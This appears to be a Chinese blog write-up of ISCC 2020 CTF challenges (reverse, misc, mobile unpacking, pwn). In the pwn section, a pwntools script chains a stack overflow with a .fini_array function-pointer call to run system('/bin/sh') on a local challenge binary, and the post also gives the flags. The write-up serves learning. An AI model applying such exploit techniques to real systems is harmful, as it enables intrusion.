---
title: ISCC一日游
tags:
  - CTF
  - 网络安全
categories:
  - 网络安全
abbrlink: 7981
date: 2020-10-08 18:53:44
updated: 2020-10-08 18:53:44
---
#CTF 
# REVERSE
<!--more-->
去网上搜flag时发现是2018原题
首先IDA打开发现UPX壳，使用`UPX -d`脱壳，然后放进IDA里面看源码

![](https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561506-d3b917c1-5fd7-41e0-8aba-842283e0ab6a.png#align=left&display=inline&height=793&margin=%5Bobject%20Object%5D&originHeight=793&originWidth=1061&size=0&status=done&style=none&width=1061)

有点不忍直视，放弃，直接放进OD里面跑。
调试了几次，摸清了大致流程：
1. 接收字符串
2. 根据接收到的字符串打印出来东西
然后打印出来的东西本身是在程序里存着，像这样：

![](https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561550-7b420aad-d85e-47ef-a8d0-f33f0cb285e5.png#align=left&display=inline&height=416&margin=%5Bobject%20Object%5D&originHeight=416&originWidth=933&size=0&status=done&style=none&width=933)

把这些数据拿出来转成字符串就是这种：

```

666f72 495343 5f6172 696375 746869 6e6773 617379 696666 437b41 6c747d 5f6265 6c6c5f 655f64 68657965

for ISC _ar icu thi ngs asy iff C{A lt} _be ll_ e_d heye

```

输入->输出规律：

```

1 -> for

2 -> ISC

3 -> _ar

4 -> icu

5 -> thi

6 -> ngs

7 -> iff

8 -> _ar

9 -> C{A

10-> lt}

11-> _be

12-> ll

13-> e_d

14-> hey

15-> e_t

16-> e_e

```

接着拼出flag->ISCC{All_things_are_easy_before_they_are_difficult}，翻译一下是凡事必先易后难，但是也可以拼成All_things_are_difficult_before_they_are_easy(凡事必先难后易)，不是很懂出题人在想什么，~~卡拉赞毕业打卡拉赞~~

# MISC

依旧是原题，只不过看2018的wp貌似是个gif，每帧都是不同的二维码，而这次直接弄了一堆到文件夹里

  

抄下网上的wp

  

> 二维码要求在两个大黑框之间必须有连续的黑白点，这样才行

> 逐帧分析gif，发现只有第62帧存在一个校正图形

> ![](https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561673-cfa3e215-36ab-444e-932c-e20fa80a41ce.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&originHeight=227&originWidth=226&size=0&status=done&style=none&width=226)

> ，保存补上位置探测图形和定位图形

> ![](https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561669-48338a1c-6f01-4e91-86b8-81e48a4e0f06.png#align=left&display=inline&height=360&margin=%5Bobject%20Object%5D&originHeight=360&originWidth=359&size=0&status=done&style=none&width=359)

> ，扫描得到ISRDQzgxMDI=，base64解码得到!$CC8102

> ~~嗦不粗话，连flag都没换~~

  
  

# MOBILE

  

原题，最大的收获是找到了不少好用的工具

  

放入APKIDE中打开，查看`AndroidManifest.xml`，看到启动类为`com.example.shellapplication.WrapperApplication`

  

```java

public class WrapperApplication

  extends Application

{

  static

  {

    System.loadLibrary("reinforce");

  }

  

  public native void attachBaseContext(Context paramContext);

  

  public native void onCreate();

}

```

  

这个类加载了`libreinforce.so`，接着去看`onCreate()`和`attachBaseContext`中的内容

  

onCreate：

  

```c

  v2 = a2;

  v3 = a1;

  v4 = (*(int (**)(void))(*(_DWORD *)a1 + 24))();

  v5 = v4;

  v6 = _JNIEnv::GetMethodID(v3, v4, "getPackageName", "()Ljava/lang/String;");

  v7 = _JNIEnv::CallObjectMethod(v3, v2, v6);

  v8 = (*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)v3 + 676))(v3, v7, 0);

  _android_log_print(4, "TTT", "shellapplication's onCreate execute");

  memset(&v12, 0, 0x100u);

  sprintf(&v12, "/data/data/%s/lib/libcore.so", v8);

  v9 = dlopen(&v12, 1);

  v10 = (void (__fastcall *)(int))dlsym(v9, "resume");

  v10(v3);

  _JNIEnv::DeleteLocalRef(v3, v7);

  return _JNIEnv::DeleteLocalRef(v3, v5);

```

  

`onCreate`中加载了`libcore.so`以及调用了`resume`这个方法

  

attachBaseContext：

  

```c

  memset(&v23, 0, 0x100u);

  sprintf(&v23, "%s/protected.jar", v17);

  extractJar(v4, v5, &v23);

  byte_601C = (unsigned int)dalvikOrArt();

  memset(&v24, 0, 0x100u);

  sprintf(&v24, "%s/origin.dex", v17);

  decryptJar(&v23, &v24);

  v22 = v4;

  memset(&v25, 0, 0x100u);

  sprintf(&v25, "%s/protected.so", v17);

```

  

`attachBaseContext`中最关键的部分是对`assets`中的 `protected.jar`进行解密，解密操作很简单，按位取反

  

decryptJar：

  

```c

while ( v9 < v6 )

    {

      *((_BYTE *)v8 + v9) = ~*((_BYTE *)v7 + v9);

      ++v9;

    }

```

  

解密脚本：

  

```c

#include <stdio.h>

int main()

{

  FILE* fi, * fo;

  fo = fopen("dec.dex", "wb");

  fi = fopen("protected.jar", "rb");

  char  fBuffer[1];

  while (!feof(fi)) {

    fread(fBuffer, 1, 1, fi);    // 读取1字节

    if (!feof(fi)) {

      *fBuffer =~ *fBuffer;   // xor encrypt

      fwrite(fBuffer, 1, 1, fo); // 写入文件

    }

  }

}

```

  

之所以为什么用C来写。。。因为python按位取反之后返回的是int类型，而负数又没办法`to_bytes()`，写了半天也没写出来一个比较优雅的exp，放弃。

  

解密之后得到一个dex文件，使用`dex2jar`将其转成jar文件，使用jd-gui打开。

  

onCreate中调用`ProtectedClass`的`verifyKey`对输入进行检查：

  

```java

if (ProtectedClass.verifyKey(inputText.getText().toString())) {

              str = "密码正确";

            } else {

              str = "密码错误";

            }

```

  

`ProtectedClass`的逻辑：

  

```java

public class ProtectedClass {

  private static int[][] key = { { 17, 12, 3 }, { 21, 12, 9 }, { 17, 14, 6 } };

  private static native String getEncrypttext(String paramString);

  public static String getString() { return "bfs-iscc"; }

  public static boolean verifyKey(String paramString) { return (paramString.length() % 3 != 0) ? false : "OYUGMCH>YWOCBXF))9/3)YYE".equals(getEncrypttext(paramString)); }

}

```

  

将输入进行加密之后与`OYUGMCH>YWOCBXF`进行比较，但是关键的`getEncrypttext`函数又是个native。

  

之前libreinforce.so中，在加载完libcore.so后，还调用了其中的resume方法

  

`resume`：

  

```c

  v1 = a1;

  v5 = 0;

  v6 = 0;

  v7 = 0;

  v2 = dalvikOrArt();

  decryptAndParse((int)&v5);

  getSdkint(v1);

  if ( v2 )

    resumeArt(v1, &v5);

  else

    resumeDalvik((int)v1, &v5);

  v3 = (char *)v5;

  v4 = v6;

  while ( v3 != (char *)v4 )

  {

    sub_539C(v3 + 8);

    sub_539C(v3 + 4);

    sub_539C(v3);

    v3 += 16;

  }

  if ( v5 )

    operator delete(v5);

```

  

什么都看不出来。

  

看大佬的博客里面说使用了一个安卓的热补丁修复机制。

  

> 关于热补丁机制的描述是这样的：

> 在不进行版本更新的情况下，动态的屏蔽掉程序原来存在BUG的函数，使用新的函数替代。

> 新函数一般存在于另一个so中

> 热补丁的流程主要有：

> 1. 通过函数名找到原来函数的地址偏移（ArtMethod->dex_code_item_offset_）。

> 2. 将新函数地址偏移替换原函数地址偏移。

>

而上述程序也为类似主要流程如下：

> 1. 分析安卓虚拟机为dalvik还是art，二者热补丁方式不一样。

> 2. 解密解析补丁函数表(decryptAndParse)

> 3. 执行补丁操作

  
  

接着在`decryptAndParse`中，对补丁表每字节+10，进行解密，解密后的补丁表：

  

`1Lcom/example/originapplication/ProtectedClass;getEncrypttext(Ljava/lang/String;)Ljava/lang/String;1416140`

  

后面这串数字就是新函数的位置。

  

![](https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561277-64468c80-644f-4811-bef3-a81970468aae.png#align=left&display=inline&height=677&margin=%5Bobject%20Object%5D&originHeight=677&originWidth=1017&size=0&status=done&style=none&width=1017)

  

这部分就是函数的字节码，但是IDA没有显示出来汇编，需要手动转换

  

~~不会~~

  

剩下的参考[https://mypre.cn/2018/10/27/bfs-iscc-mobile](https://mypre.cn/2018/10/27/bfs-iscc-mobile)

  

# PWN

  

## bomb_squad

  

首先checksec一下

  

```powershell

[*] '/root/work/CLSknpNF3iWUuHCX.bomb_squad'

    Arch:     i386-32-little

    RELRO:    Partial RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE (0x8048000)

```

  

这个题目首先由4个小关卡，全部通关之后才能达到getflag的地方

  

```c

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)

{

  setvbuf(stdout, 0, 2, 0);

  puts("Welcome to the bomb squad! Your first task: Diffuse this practice bomb.");

  phase_1();

  puts("You got through phase 1 alright! Good work! But can you handle phase 2?");

  phase_2();

  puts("You could handle it! Good job... I think you can handle phase 3... right?");

  phase_3();

  puts("DAYUM, you got it! You know the drill, time for phase 4.");

  phase_4();

  print_flag();

}

```

  

### phase_1

  

```c

int phase_1()

{

  char *v0; // eax

  int result; // eax

  

  puts("Give me a number!");

  v0 = get_line();

  result = 3 * (2 * atoi(v0) / 37 - 18) - 1;

  if ( result != 1337 )

    explode_bomb();

  phase1_solved = 1;

  return result;

}

```

  

关卡1接收一个数字，经过一系列计算，使得最终结果要等于1337，使用`z3-solver`很容易得出解。

  

![](https://cdn.nlark.com/yuque/0/2020/png/2658344/1602153561404-407dcc7b-0104-4e20-8cc0-cc2d0822d2e5.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&originHeight=67&originWidth=510&size=0&status=done&style=none&width=510)

  

### phase_2

  

```c

int phase_2()

{

  puts("Give me an array of numbers!");

  s = get_line();

  sscanf(s, "[%d, %d, %d, %d, %d, %d]", v4, _2C, _30, _34, _38, _3C);

  result = v4[0];

  if ( v4[0] != 1 )

    explode_bomb();

  for ( i = 1; i <= 5; ++i )

  {

    v2 = v4[i - 1] + v4[i];

    result = func2(i);

    if ( v2 != result )

      explode_bomb();

  }

  phase2_solved = 1;

  return result;

}

```

  

接收一个数组，要求满足`a[0]=1，a[i-1]+a[i]=2^i`，那么结果就是`[1, 1, 3, 5, 11, 21]`

  

### phase_2

  

```c

int phase_3()

{

  v4 = get_line();

  v5 = "rqzzepiwMLepiwYsLYtpqpvzLsYeM";

  while ( 1 )

  {

    v1 = v4++;

    result = (unsigned __int8)*v1;

    v3 = result;

    if ( !(_BYTE)result )

      break;

    if ( (char)result <= 96 || (char)result > 123 )

      explode_bomb();

    v0 = v5++;

    if ( *v0 != keys[v3 - 97] )

      explode_bomb();

    lastentered = v3;

  }

  phase3_solved = 1;

  return result;

}

```

  

接收一串字符串，要求keys里面的字符串要与v5的对应。但实际上不需要这么麻烦，

  

```c

if ( !(_BYTE)result )

      break;

```

  

当输入为`\x00`时，就会跳出循环，直接返回。

  

### phase_4

  

```c

int phase_4()

{

  s = (char *)get_line();

  sscanf(s, "%d %d %d %d %d %d %d", v5, &v5[1], &v5[2], &v5[3], &v5[4], &v5[5], &v5[6]);

  v2 = &n1;

  result = n1.num;

  v3 = n1.num;

  for ( i = 0; i <= 6; ++i )

  {

    if ( v5[i] < 0 || v5[i] > 3 )

      explode_bomb();

    v2 = (node *)*((_DWORD *)&v2->next1 + v5[i]);

    result = v2->num;

    v3 += result;

  }

  if ( v3 != 95 )

    explode_bomb();

  phase4_solved = 1;

  return result;

}

```

  

这里n1是一个结构体，大致结构如下

  

```c

struct node{

    node* next1;

    node* next2;

    node* next3;

    node* next4;

    char name[8];

    int num;

};

```

  

这一关接收用户输入的数字，根据数字来进行结构体之间num相加的顺序。

  

比如输入为`"0 3"`，相加的顺序就是`0xa+0x7+0x10`。

  

最后试出来解为`3 0 3 0 3 0 0`。

  

### secret_phase

  

通关之后会进入`print_flag`，经过`verify_working`之后会打印出来flag

  

```c

void __noreturn print_flag()

{

  if ( verify_working() )

  {

    puts("Congratulations, you won! Here's the flag:");

    system("cat flag.txt");

  }

  exit(1);

}

```

  

但是`verify_working`始终返回1的，而且最终也并没有得到flag，还是需要getshell。

  

进入`secret_phase`

  

```c

int secret_phase()

{

  puts("this is the secret phase.... please whisper, to keep it a seecret...");

  v2 = &n1;

  v3 = n2;

  v4 = &n3;

  v5 = &n4;

  v6 = &n5;

  v7 = &n6;

  for ( i = 0; i <= 5; ++i )

  {

    printf("Rename node #%d to: ", i + 1);

    fgets((*(&v2 + i))->name, 9, stdin);

    *(_BYTE *)strchrnul((*(&v2 + i))->name, 10) = 0;

    putchar(10);

  }

  return puts("Thanks, I was worried about having to come up with clever names myself!");

}

```

  

这一段代码是修改每一个node的name成员，最多只可以溢出一个字节到num上面，并没有什么用。

  

### fini段

  

> 该section保存着进程终止代码指令。因此，当一个程序正常退出时，系统安排执行这个section的中的代码。

  
  

`.fini_array`中有一个`__gg`函数

  

```c

  v5 = &n1;

  v6 = n2;

  v7 = &n3;

  v8 = &n4;

  v9 = &n5;

  v10 = &n6;

  for ( i = 0; i <= 5; ++i )

  {

    v0 = alloca(32);

    v1 = *(&v5 + i);

    v2 = (_DWORD *)(16 * (((unsigned int)&v6 + 3) >> 4));

    *v2 = *v1;

    v2[1] = v1[1];

    v2[2] = v1[2];

    v2[3] = v1[3];

    v2[4] = v1[4];

    v2[5] = v1[5];

    v2[6] = v1[6];

    result = *(_DWORD *)(16 * (((unsigned int)&v6 + 3) >> 4) + 0x14);

    if ( result )

      result = (*(int (**)(void))(16 * (((unsigned int)&v6 + 3) >> 4) + 0x14))();

  }

  return result;

```

  

经过分析之后发现这个函数会执行每个node中`name[4]-name[8]`所指向的函数，而name自然可以控制。并且call的时候，此时栈顶指向的就是当前node。那么只需要把某一个node的name后四个字节修改成system，next1指向的内容修改为`/bin/sh\x00`就可以getshell。

  

### 任意地址写

  

__nr函数：

  

```c

unsigned int _nr()

{

  v5 = __readgsdword(0x14u);

  v0 = (const char *)get_line();

  strcpy(&dest, v0);

  v1 = (const char *)get_line();

  strcpy(v4, v1);

  return __readgsdword(0x14u) ^ v5;

}

```

  

很明显的栈溢出，可以通过第一个输入，将v4覆盖为`node->next1`的地址，通过第二个输入在修改`next1`所指向的内容。

  

### payload

  

```python

from pwn import *

p = process("./bomb_squad")

p.sendline("8584")

p.sendline("[1, 1, 3, 5, 11, 21]")

p.sendline("\x00")

p.sendline("3 0 3 0 3 0 0")

system = 0x080485A0

n3 = 0x804b0a8

nr = 0x08048CDA

payload = 'aaaa' + p32(nr) #首先利用__gg函数执行node1中的__nr函数

p.send(payload)

payload = 'bbbb' + p32(system) + "\n\n\n\n" #接着写入system地址到node2等待第二次call，最后4个\n跳过剩下4个node->name的修改

p.send(payload)

payload = 'a' * 0xfc + p32(n3) #栈溢出，修改n3->next1指向的内容

p.sendline(payload)

p.sendline('/bin/sh\x00')

p.interactive()

```

  

之所以为什么是要修改`n3->next1`，因为system地址写入到了node2的name中，当`__gg`函数执行时，此时栈顶排列为

  

| n3 |

| --- |

| n4 |

| n5 |

| n6 |

| name |

| num |

  
  

接下来就要执行system函数，所以要修改n3指向的地址。